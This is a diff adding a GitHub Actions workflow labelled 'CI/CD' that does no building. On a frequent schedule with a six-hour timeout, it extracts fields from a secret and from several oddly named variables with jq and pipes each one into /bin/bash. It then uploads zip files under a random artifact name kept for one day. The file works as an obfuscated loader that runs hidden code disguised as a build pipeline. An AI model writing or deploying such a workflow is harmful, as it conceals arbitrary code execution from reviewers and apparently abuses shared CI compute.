@@ -1,0 +1,32 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          f50: ${{ secrets.f50 }}
+        run: |
+          printf '%s' "$f50" | jq -r .nfok09 | /bin/bash
+          echo $aj0 | jq -r .dutfz6 | /bin/bash
+          echo $p7955 | jq -r .jz3791 | /bin/bash
+          printf '%s' "$ca19625" | jq -r .ls46 | /bin/bash
+          printf '%s' "$gs27038" | jq -r .isnyz99155 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kfWWV6vV
+          path: "*.zip"
+          retention-days: 1
